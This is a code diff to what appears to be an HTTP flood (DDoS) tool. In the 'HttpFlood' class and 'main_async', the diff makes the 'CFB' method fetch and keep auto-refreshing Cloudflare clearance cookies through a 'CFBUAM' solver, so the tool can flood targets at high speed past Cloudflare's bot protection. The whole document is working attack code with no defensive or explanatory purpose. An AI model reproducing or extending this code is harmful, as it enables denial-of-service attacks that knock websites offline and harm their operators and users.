@@ -4173,6 +4173,13 @@ class HttpFlood:
         Uses shared cf_clearance cookies if available for high-speed flooding.
         Falls back to synchronous cloudscraper if no clearance is found.
         """
+        if not HttpFlood._cfbuam_cookie or HttpFlood._cfbuam_cookie == "_yummy=choco":
+            if HttpFlood._solve_phase != "solving":
+                try:
+                    await self.CFBUAM()
+                except Exception:
+                    pass
+
         # If we have a valid clearance from CFBUAM, use the fast path
         if HttpFlood._cfbuam_cookie and HttpFlood._cfbuam_cookie != "_yummy=choco":
             try:
@@ -5705,7 +5712,7 @@ async def main_async():
                 now = time()
                 # If TTL < 120s and not already solving
                 if HttpFlood._cfbuam_expiry and (HttpFlood._cfbuam_expiry - now) < 120 and HttpFlood._solve_phase != "solving":
-                    if method in ["CFBUAM", "BEHAVIOR", "BYPASS"]:
+                    if method in ["CFBUAM", "BEHAVIOR", "BYPASS", "CFB"]:
                         HttpFlood._solve_phase = "solving"
                         logger.info(f"{bcolors.OKCYAN}[*] Auto-Refresh: Pre-solving new cookie for {target_host}...{bcolors.RESET}")
                         try:
@@ -5731,7 +5738,7 @@ async def main_async():
                             HttpFlood._solve_phase = "flooding"
                 await asyncio.sleep(10)
         
-        if method in ["CFBUAM", "BEHAVIOR", "BYPASS"]:
+        if method in ["CFBUAM", "BEHAVIOR", "BYPASS", "CFB"]:
             asyncio.create_task(cookie_auto_refresher())
 
         while time() < ts + timer:
